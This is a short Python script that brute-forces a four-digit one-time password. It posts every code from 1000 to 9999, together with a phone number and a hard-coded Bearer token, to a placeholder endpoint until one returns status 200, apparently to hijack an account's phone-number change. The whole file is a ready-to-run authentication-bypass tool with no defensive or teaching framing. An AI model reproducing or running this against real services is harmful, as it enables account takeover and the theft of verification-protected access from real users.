#!/usr/bin/python3

import requests
import os
import json
import sys

# clean screen
os.system("cls")
os.system("clear")

logo = '''
                 ########################################
                    ------- Devloper by Yousef -----------
                           Twitter : y0usef_11
                 ########################################
'''

print (logo)

for i in range(1000, 9999):
    # loops Guess the numbers
    number = "{:04d}".format(i)

    url = "https://example"
    data = {'code': number ,'PhoneNumber':"00000000000"} # enter number for change
    header = {"Content-Type" : "application/json" , "Authorization" : "Bearer TEZTApFI9Ziucpdj1ndK_0bGLRHAFNdcSPWCP1X61Wz2iitVDERG8ZE"}

    re = requests.post(url , data=json.dumps(data) , headers=header)

    if re.status_code == 200:
        print ("[+] otp is catch" , "otp number" , i ,"Satus code is" ,re.status_code)
        sys.exit(0)
    else :
        print ("[-] otp Not same " , "otp number" ,i ,"Satus code is" ,re.status_code)
